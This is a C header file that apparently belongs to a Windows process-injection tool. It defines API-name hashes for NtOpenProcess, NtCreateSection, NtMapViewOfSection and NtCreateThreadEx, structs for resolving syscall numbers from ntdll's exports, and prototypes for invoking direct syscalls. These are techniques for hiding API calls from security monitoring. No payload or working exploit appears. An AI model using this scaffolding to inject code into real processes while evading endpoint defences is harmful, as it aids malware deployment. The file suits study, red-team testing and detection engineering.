#pragma once
#include <windows.h>
#include <stdio.h>
#include "structs.h"

/// Macros
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// Debug messages
#define OKAY(MSG, ...) printf("[+] " MSG "\n", ##__VA_ARGS__)
#define OKAY_W(MSG, ...) wprintf(L"[+] " MSG L"\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[#] " MSG "\n", ##__VA_ARGS__)
#define INFO_W(MSG, ...) wprintf(L"[#] " MSG L"\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] " MSG "\n", ##__VA_ARGS__)
#define WARN_W(MSG, ...) fwprintf(stderr, L"[-] " MSG L"\n", ##__VA_ARGS__)
#define PRINT_ERROR(FUNCTION_NAME)                                        \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: %d. [%s:%d]  \n",   \
                GetLastError(), __FILE__, __LINE__);                      \
    } while (0)
#define PRINT_NTERROR(FUNCTION_NAME)                                      \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: 0x%X. [%s:%d]  \n", \
                STATUS, __FILE__, __LINE__);                              \
    } while (0)

// Function hashes
#define NtOpenProcess_HASH 0x14023472240A509D
#define NtCreateSection_HASH 0x0903D9BEC019D655
#define NtMapViewOfSection_HASH 0x67CF1430F2B39CCF
#define NtUnmapViewOfSection_HASH 0xDA83D6D660130552
#define NtCreateThreadEx_HASH 0x297F11A1B86E8755
#define NtWaitForSingleObject_HASH 0xD4C9894C2B8ECB81
#define NtClose_HASH 0xAAAA38FF81D313C2

// Direct syscalls implementation
#define UP     -32
#define DOWN    32
#define RANGE  0xFF

typedef struct _NTDLL_CONFIG {
    PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of ntdll's exported functions   
    PDWORD      pdwArrayOfNames;     // The VA of the array of names of ntdll's exported functions       
    PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of ntdll's exported functions     
    DWORD       dwNumberOfNames;     // The number of exported functions from ntdll.dll                 
    ULONG_PTR   uModule;             // The base address of ntdll - requred to calculated future RVAs  

} NTDLL_CONFIG, * PNTDLL_CONFIG;

typedef struct _NT_SYSCALL {
    DWORD dwSSN;                    // syscall number
    DWORD dwSyscallHash;            // syscall hash value
    PVOID pSyscallAddress;          // syscall address
} NT_SYSCALL, * PNT_SYSCALL;

typedef struct _NTAPI_FUNC {
    NT_SYSCALL NtOpenProcess;
    NT_SYSCALL NtCreateSection;
    NT_SYSCALL NtMapViewOfSection; 
    NT_SYSCALL NtUnmapViewOfSection;
    NT_SYSCALL NtWriteVirtualMemory;
    NT_SYSCALL NtCreateThreadEx;
    NT_SYSCALL NtWaitForSingleObject;
    NT_SYSCALL NtClose;
} NTAPI_FUNC, * PNTAPI_FUNC;

// Functions prototypes for direct syscall invokation
extern VOID PrepareSyscall(WORD wSystemCall);
extern RunSyscall();

DWORD64 djb2(PBYTE str);
VOID PrintHashes();
BOOL InitializeDirectSyscalls(IN PNTAPI_FUNC Nt);

